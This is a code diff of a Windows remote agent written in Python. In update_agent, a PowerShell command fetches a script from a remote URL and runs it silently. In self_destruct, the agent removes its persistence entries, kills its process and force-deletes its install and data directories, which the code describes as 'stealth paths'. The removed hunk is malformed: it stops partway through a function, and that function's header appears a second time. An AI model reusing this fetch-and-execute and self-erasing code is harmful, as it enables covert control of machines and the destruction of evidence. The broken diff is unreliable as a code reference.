@@ -1031,9 +1031,10 @@ async def update_agent(url: str) -> Tuple[str, bool]:
         if not url.startswith("http"):
              return "Invalid URL for update. Must be http/https", False
              
-        # Command to run the installer
+        # Command to run the installer with -Silent flag so it won't prompt for input
         # We wrap in a short delay to allow this request to report back first
-        ps_command = f"Start-Sleep -Seconds 5; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '{url}' -UseBasicParsing | Invoke-Expression"
+        # Uses ScriptBlock::Create to pass -Silent parameter to the downloaded script
+        ps_command = f"Start-Sleep -Seconds 5; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; & ([ScriptBlock]::Create((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content)) -Silent"
         
         # Launch detached PowerShell
         # Uses same technique as self_destruct to survive process kill
@@ -1061,39 +1062,11 @@ async def update_agent(url: str) -> Tuple[str, bool]:
 async def self_destruct() -> Tuple[str, bool]:
     """
     SELF DESTRUCT: Completely remove the agent from the system.
-    Flow (order matters so folders can be deleted):
-    1. Batch cd's out of install dir (so nothing holds a lock on SystemCache)
-    2. Remove persistence (tasks, registry, shortcuts)
-    3. Kill agent process (so install dir is not in use)
-    4. Delete install dir and data dir
-    Uses stealth paths from install.ps1.
-    """
-    if platform.system() != "Windows":
-        return "Self-destruct only supported on Windows", False
-    
-    try:
-        install_dir = get_install_dir()
-        temp_dir = Path(os.environ.get('TEMP', '/tmp'))
-        paths_file = temp_dir / 'cleanup_paths.txt'
-        batch_path = temp_dir / 'cleanup_temp.bat'
-
-        print(f"[SELF_DESTRUCT] Install dir: {install_dir}, Data dir: {DATA_DIR}")
-        cleanup_report = []
-
-        # Write paths to file so batch/PowerShell get exact paths (no escaping issues)
-        paths_file.write_text(
-            str(install_dir.resolve()) + '\n' + str(DATA_DIR.resolve()),
-            encoding='utf-8'
-        )
-
-        # Kill by CommandLine (matches install.ps1 logic) so we catch pythonw/python with agent.py
-        kill_ps = "Get-WmiObject Win32_Process | Where-Object { ($_.Name -eq 'python.exe' -or $_.Name -eq 'pythonw.exe') -and $_.CommandLine -like '*agent.py*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
-
-        # PowerShell script: wait so agent/batch exit and release handles, then read paths file and Remove-Item
-async def self_destruct() -> Tuple[str, bool]:
-    """
-    SELF DESTRUCT: Completely remove the agent from the system.
-    Spawns a detached PowerShell process to clean up persistence, kill the agent, and remove files.
+    Spawns a detached PowerShell process that:
+    1. cd's to TEMP (so nothing holds a lock on SystemCache)
+    2. Removes persistence (scheduled tasks, registry, startup shortcuts)
+    3. Kills the agent process
+    4. Deletes the install dir and data dir (with fallback to cmd /c rd /s /q)
     """
     if platform.system() != "Windows":
         return "Self-destruct only supported on Windows", False
@@ -1103,8 +1076,13 @@ async def self_destruct() -> Tuple[str, bool]:
         data_dir = str(DATA_DIR.resolve())
         pid = os.getpid()
         
+        print(f"[SELF_DESTRUCT] Install dir: {install_dir}, Data dir: {data_dir}, PID: {pid}")
+        
         # Robust cleanup script
         ps_script = f"""
+        # 0. Move working directory OUT of install dir so it can be deleted
+        Set-Location $env:TEMP
+        
         Start-Sleep -Seconds 4
         
         # 1. Remove Persistence
@@ -1121,13 +1099,27 @@ async def self_destruct() -> Tuple[str, bool]:
             Get-WmiObject Win32_Process | Where-Object {{ ($_.Name -like 'python*' -and $_.CommandLine -like '*agent.py*') }} | ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }}
         }} catch {{ }}
         
-        Start-Sleep -Seconds 2
+        Start-Sleep -Seconds 3
         
-        # 3. Delete Files (Install Dir + Data Dir)
-        try {{
-            if (Test-Path '{install_dir}') {{ Remove-Item '{install_dir}' -Recurse -Force -ErrorAction SilentlyContinue }}
-            if (Test-Path '{data_dir}') {{ Remove-Item '{data_dir}' -Recurse -Force -ErrorAction SilentlyContinue }}
-        }} catch {{ }}
+        # 3. Delete Files (Install Dir + Data Dir) with retry and fallback
+        foreach ($dir in @('{install_dir}', '{data_dir}')) {{
+            if (Test-Path $dir) {{
+                # Attempt 1: PowerShell Remove-Item
+                try {{ Remove-Item $dir -Recurse -Force -ErrorAction Stop }} catch {{ }}
+                
+                # Attempt 2: If still exists, use cmd /c rd /s /q (more aggressive)
+                if (Test-Path $dir) {{
+                    Start-Sleep -Seconds 2
+                    cmd /c rd /s /q "$dir" 2>$null
+                }}
+                
+                # Attempt 3: Final retry after a delay
+                if (Test-Path $dir) {{
+                    Start-Sleep -Seconds 3
+                    try {{ Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue }} catch {{ }}
+                }}
+            }}
+        }}
         """
         
         # Use EncodedCommand to avoid quoting/escaping issues
